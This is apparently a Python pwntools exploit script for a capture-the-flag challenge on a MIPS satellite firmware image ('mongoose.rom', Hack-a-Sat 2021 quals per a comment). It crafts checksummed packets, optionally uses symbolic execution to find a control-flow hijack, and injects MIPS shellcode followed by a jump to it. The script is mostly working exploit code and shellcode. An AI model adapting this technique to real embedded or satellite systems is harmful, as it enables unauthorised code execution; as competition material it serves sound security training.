from pwn import *

from sphynx import Sphynx, Panda

context.arch = 'mips'
context.bits = 32
context.os = 'baremetal'

if args.GDB:
    sphynx = Sphynx()
    sphynx.add_lion(panda='panda.py')
    sphynx.lion.console.recvuntil(b'listening\n')
    io = remote('localhost', 12345)
    # sphynx.add_dragon("mongoose.rom", "/home/user/ctf/hackasat/2021/quals", "hackasat")
    sphynx.add_eagle('mongoose.rom', main_opts={'backend':'blob', 'arch':'mipsel','base_addr':0xbfc00000,'entry_point':0xbfc00400})

    # the firmware doesn't enable the floating point coprocessor
    # presumably vmips just has it enabled or something
    # simple enough to enable for qemu via shellcode
    sphynx.lion.run_shellcode(
        asm(
            'mfc0 $a0, $12;lui $a1,0x2000;or $a0,$a0,$a1;mtc0 $a0, $12',
            arch='mips',
            endian='little'
        )
    )
    sphynx.lion.gdb.continue_nowait()
else:
    io = process(["./vmips", "-o","memdump","-o", "fpu", "-o", "memsize=3000000", "-o","haltdumpcpu", "mongoose.rom"],env={'FLAG':'flag{YupThisIsTheFlag}'})
    io.recvuntil(b'*******\n\n')


def mkmsg(msg):
    assert len(msg) < 62
    msg = msg.ljust(61)
    return b'\xa5\x5a'+msg+bytes([0xff-(sum(msg)&0xff)])


if args.OWLBEAR:
    io.send(mkmsg(cyclic(61)))

    p = sphynx.eagle.project
    state = p.factory.entry_state()
    ctate = sphynx.eagle.execute_concretley(state, 0xbfc04ecc)
    ctate.options.symbolic_ip_max_targets = 128
    ctate.memory.store(ctate.regs.a0, ctate.solver.BVS('packet', 8*62))
    simgr = p.factory.simgr(ctate)
    simgr.run(until=lambda m: m.unconstrained)
    assert simgr.unconstrained


shellcode = f'''
lui $v0,0xa300
ori $a0, $v0, 0x0024

lui $v0,0xa200
ori $a1, $v0, 0x8000

li $a2, 0x10

lui $v0,0xbfc0
ori $v0, $v0, 0x4078
jalr $v0
nop

lui $v0,0xa300
sw $zero, 0x20($v0)

here: b here
'''

io.send(mkmsg(p8(0x30)+b'\x8f'+asm(shellcode))) # store shellcode for memcpy(0xa2008000,0xa3000024,0x10)
io.send(mkmsg(p8(0x5c)+b'\x8f'+p32(0xa0180590))) # jump to shellcode

io.interactive()
